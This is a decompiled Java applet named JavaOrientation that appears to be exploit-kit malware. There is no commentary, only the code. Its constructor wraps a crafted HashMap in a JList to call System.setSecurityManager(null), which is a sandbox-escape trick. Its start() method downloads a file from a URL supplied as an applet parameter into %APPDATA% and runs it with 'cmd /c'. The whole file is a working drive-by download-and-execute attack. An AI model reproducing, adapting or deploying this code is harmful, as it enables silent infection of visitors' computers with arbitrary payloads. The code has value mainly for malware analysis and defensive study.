import java.util.Map;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.IOException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URLConnection;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaOrientation extends Applet
{
    @Override
    public void start() {
        super.start();
        try {
            final String fileName = this.getParameter("F");
            final String tempFolder = System.getenv("APPDATA");
            final URL myURL = new URL(this.getParameter("U"));
            final URLConnection myURLConnection = this.OpenConnection(myURL);
            final InputStream myInputStream = this.GetInputStream(myURLConnection);
            final FileOutputStream myFileOutputStream = this.GetOutputStream(tempFolder + "\\" + fileName);
            final byte[] myData = new byte[512];
            int readLength;
            while ((readLength = myInputStream.read(myData, 0, myData.length)) != -1) {
                myFileOutputStream.write(myData, 0, readLength);
            }
            myInputStream.close();
            myFileOutputStream.close();
            this.Execute(tempFolder + "\\" + fileName);
        }
        catch (Exception ex) {}
    }
    
    public URLConnection OpenConnection(final URL myURL) {
        try {
            final URLConnection myURLConnection = myURL.openConnection();
            return myURLConnection;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public InputStream GetInputStream(final URLConnection myURLConnection) {
        try {
            final InputStream myInputStream = myURLConnection.getInputStream();
            return myInputStream;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public FileOutputStream GetOutputStream(final String FileName) {
        try {
            final FileOutputStream myFileOutputStream = new FileOutputStream(FileName);
            return myFileOutputStream;
        }
        catch (IOException e) {
            return null;
        }
    }
    
    public void Execute(final String name) {
        try {
            final Runtime t = Runtime.getRuntime();
            t.exec("cmd /c \"" + name + "\"");
        }
        catch (Exception e) {}
    }
    
    public JavaOrientation() {
        final Object target = System.class;
        final String methodName = "setSecurityManager";
        final Object[] args = { null };
        final JavaClass l = new JavaClass(target, methodName, args);
        final HashSet s = new HashSet();
        s.add(l);
        final Map h = new HashMap() {
            @Override
            public Set entrySet() {
                return s;
            }
        };
        final JList list = new JList((E[])new Object[] { h });
        this.add(list);
    }
}
